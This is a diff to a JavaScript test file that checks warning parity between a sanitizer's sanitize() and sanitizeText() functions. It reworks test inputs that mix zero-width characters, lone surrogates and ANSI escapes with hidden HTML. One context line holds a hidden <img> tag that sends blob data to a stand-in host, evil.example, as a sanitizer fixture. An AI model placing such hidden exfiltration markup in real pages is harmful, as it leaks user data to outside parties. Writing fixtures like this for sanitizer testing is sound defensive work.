@@ -50,12 +50,15 @@ const CASES = [
     `<div hidden><img src="https://evil.example/x?data=${BLOB}"></div>`,
   ],
   ["benign html", "hello <b>world</b>"],
-  // Layer 1 AND Layer 2 in one input, so the "every unfiltered warning is a
-  // Layer 1 alongside Layer 2, so the Layer-1 lines are compared too rather
-  // than the corpus only ever exercising Layers 2/3.
-  ["zero-width char inside spliced html", "a\u200b<!-- hi --> b"],
-  ["lone surrogate inside spliced html", "a\ud800<!-- hi --> b"],
-  ["ansi escape inside spliced html", "a\u001b[31mred\u001b[0m <!-- hi --> b"],
+  // Layer 1 AND Layer 2 in one input, so the combined warning list (Layer-1
+  // lines alongside the Layer-2 splice line, in order) is compared too rather
+  // than the corpus only ever exercising one layer per case.
+  ["zero-width char beside spliced html", "a\u200b<i hidden>S</i> b"],
+  ["lone surrogate beside spliced html", "a\ud800<i hidden>S</i> b"],
+  [
+    "ansi escape beside spliced html",
+    "a\u001b[31mred\u001b[0m <i hidden>S</i> b",
+  ],
 ];
 
 describe("warning parity between sanitize() and sanitizeText()", () => {
